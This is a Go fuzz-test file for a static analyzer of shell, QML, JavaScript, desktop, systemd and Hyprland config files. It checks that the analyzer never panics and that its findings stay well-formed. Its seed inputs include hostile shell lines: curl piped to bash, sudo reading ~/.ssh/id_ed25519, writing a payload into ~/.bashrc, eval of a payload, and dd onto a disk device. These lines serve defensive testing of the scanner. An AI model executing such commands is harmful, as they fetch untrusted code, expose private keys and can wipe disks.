package analyze

import (
	"path/filepath"
	"strings"
	"testing"
)

func FuzzQMLAnalyzerNeverPanics(f *testing.F) {
	for _, seed := range [][]byte{
		[]byte(`Process { command: ["curl", "https://example.test"] }`),
		[]byte(`/* Process { command: ["sudo"] } */ Item {}`),
		[]byte(`Process { command: [root.binary, "--flag"]`),
		[]byte("property string hostile: \"before\x00after\""),
		[]byte("property string inert: `Process { command: [\\\"sudo\\\"] }`"),
		[]byte("Process { property var nested: ({ command: [\"pkexec\"] }) }"),
		[]byte("Item { property string exe: \"curl\"; property var launch: [exe, \"https://example.test\"]; Process { command: launch } }"),
		[]byte("Item { property var first: second; property var second: first; Process { command: first } }"),
		[]byte("Item { property var duplicate: [\"one\"]; property var duplicate: [\"two\"]; Process { command: duplicate } }"),
		{0xff, 0xfe, '{', '}', 0x00},
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 2<<20 {
			t.Skip()
		}
		assertAnalyzerResult(t, Sources(withValidManifest(map[string][]byte{"Fuzz.qml": data})))
	})
}

func FuzzShellAnalyzerNeverPanics(f *testing.F) {
	for _, seed := range [][]byte{
		[]byte("curl https://example.test/i | bash\n"),
		[]byte("sudo -- cat ~/.ssh/id_ed25519\n"),
		[]byte("sudo -u root cat ~/.ssh/id_ed25519\n"),
		[]byte("eval \"$payload\"\n"),
		[]byte("printf payload > ~/.bashrc\ncat < ~/.ssh/id_ed25519\n"),
		[]byte("base64 --decode payload > decoded | bash\n"),
		[]byte("exec 3<> \"$dynamic\"\n"),
		[]byte("curl -o ./payload https://example.test/payload\nbash ./payload\n"),
		[]byte("wget --output-document=\"$target\" https://example.test/payload\nsource \"$target\"\n"),
		[]byte("dd if=/dev/nvme0n1p1 of=/dev/mapper/cryptroot bs=4M status=progress\n"),
		[]byte("env dd if=\"$input\" of=\"$output\"\n"),
		[]byte("dd if=first if=second of=\n"),
		[]byte("$(unterminated\n"),
		{0xff, 0xfe, '$', '(', 0x00},
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 2<<20 {
			t.Skip()
		}
		assertAnalyzerResult(t, Sources(withValidManifest(map[string][]byte{"fuzz.sh": data})))
	})
}

func FuzzPythonTreeSitterAnalyzerNeverPanics(f *testing.F) {
	for _, seed := range [][]byte{[]byte("print('ok')\n"), []byte("def broken(:\n"), []byte("# call()\ntext = 'call()'\n")} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 64<<10 {
			t.Skip()
		}
		assertAnalyzerResult(t, Sources(withValidManifest(map[string][]byte{"fuzz.py": data})))
	})
}

func FuzzJavaScriptTreeSitterAnalyzerNeverPanics(f *testing.F) {
	for _, seed := range [][]byte{
		[]byte("print('ok');\n"), []byte("function broken( {\n"), []byte("// call()\nconst x = 'call()';\n"),
		[]byte(`child_process.spawn("curl", buildArguments());`),
		[]byte(`const runtimeURL = loadURL(); child_process.spawn("curl", ["--url", runtimeURL]);`),
		[]byte(`child_process.execFile("tool", [], {shell: true}, () => {});`),
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 64<<10 {
			t.Skip()
		}
		assertAnalyzerResult(t, Sources(withValidManifest(map[string][]byte{"fuzz.js": data})))
	})
}

func FuzzDesktopEntryAnalyzerNeverPanics(f *testing.F) {
	for _, seed := range [][]byte{
		[]byte("[Desktop Entry]\nExec=viewer %F\n"),
		[]byte("[Desktop Entry]\nExec=\"unterminated\n"),
		[]byte("[Other]\nExec=sudo\n"),
		{0xff, 0xfe, '[', 0x00, ']'},
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 2<<20 {
			t.Skip()
		}
		assertAnalyzerResult(t, Sources(withValidManifest(map[string][]byte{"fuzz.desktop": data})))
	})
}

func FuzzSystemdUnitAnalyzerNeverPanics(f *testing.F) {
	for _, seed := range [][]byte{
		[]byte("[Service]\nExecStart=/bin/echo %h $ARG\n"),
		[]byte("[Service]\nExecStart=\"unterminated\n"),
		[]byte("[Install]\nWantedBy=default.target\n"),
		[]byte("[Service]\nExecStart=/bin/echo first \\\n second\n"),
		{0xff, 0xfe, '[', 0x00, ']'},
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 2<<20 {
			t.Skip()
		}
		assertAnalyzerResult(t, Sources(withValidManifest(map[string][]byte{"fuzz.service": data})))
	})
}

func FuzzHyprlandConfigAnalyzerNeverPanics(f *testing.F) {
	for _, seed := range [][]byte{
		[]byte("exec-once = curl https://example.test/install | bash\n"),
		[]byte("bind = SUPER, Q, exec, /bin/echo hello,world\n"),
		[]byte("source = $HOME/runtime.conf\nplugin = ./plugin.so\n"),
		[]byte("exec = [unterminated\n"),
		{0xff, 0xfe, '=', 0x00},
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 2<<20 {
			t.Skip()
		}
		assertAnalyzerResult(t, Sources(withValidManifest(map[string][]byte{"hyprland.conf": data})))
	})
}

func FuzzLiteralInvocationResolutionNeverEscapesCandidates(f *testing.F) {
	for _, seed := range [][2]string{{"scripts/caller.sh", "./helper.sh"}, {"caller.sh", "../outside"}, {"caller.sh", "/host/path"}, {"scripts/caller.sh", "helper.sh"}} {
		f.Add(seed[0], seed[1])
	}
	candidates := map[string]bool{"helper.sh": true, "scripts/helper.sh": true, "scripts/caller.sh": true}
	f.Fuzz(func(t *testing.T, caller, target string) {
		if len(caller)+len(target) > 16<<10 {
			t.Skip()
		}
		for _, match := range resolveLiteralTarget(caller, target, candidates) {
			if !candidates[match] || match == "." || match == ".." || strings.HasPrefix(match, "../") || filepath.IsAbs(match) {
				t.Fatalf("literal resolver escaped candidates: caller=%q target=%q match=%q", caller, target, match)
			}
		}
	})
}

func assertAnalyzerResult(t *testing.T, result Result) {
	t.Helper()
	ids := make(map[string]bool)
	for _, operation := range result.Operations {
		if operation.ID == "" || ids[operation.ID] {
			t.Fatalf("operation ID is empty or duplicated: %#v", result.Operations)
		}
		ids[operation.ID] = true
		if operation.Evidence.Path == "" || operation.Evidence.LineStart < 1 || operation.Evidence.LineEnd < operation.Evidence.LineStart {
			t.Fatalf("operation evidence is invalid: %#v", operation)
		}
	}
	findingIDs := make(map[string]bool)
	for _, finding := range result.Findings {
		if finding.ID == "" || findingIDs[finding.ID] || len(finding.Evidence) == 0 {
			t.Fatalf("finding identity or evidence is missing: %#v", finding)
		}
		findingIDs[finding.ID] = true
		for _, related := range finding.Related {
			if !ids[related] {
				t.Fatalf("finding references missing operation %q: %#v", related, finding)
			}
		}
	}
	resourceIDs := make(map[string]bool)
	for _, resource := range result.Resources {
		if resource.ID == "" || resourceIDs[resource.ID] || !ids[resource.RelatedOperationID] {
			t.Fatalf("resource identity or operation link is invalid: %#v", resource)
		}
		resourceIDs[resource.ID] = true
	}
	unknownIDs := make(map[string]bool)
	for _, unknown := range result.Unknowns {
		if unknown.ID == "" || unknownIDs[unknown.ID] || len(unknown.Evidence) == 0 {
			t.Fatalf("unknown identity or evidence is invalid: %#v", unknown)
		}
		unknownIDs[unknown.ID] = true
		for _, affected := range unknown.AffectedOperations {
			if !ids[affected] {
				t.Fatalf("unknown references missing operation %q: %#v", affected, unknown)
			}
		}
	}
}
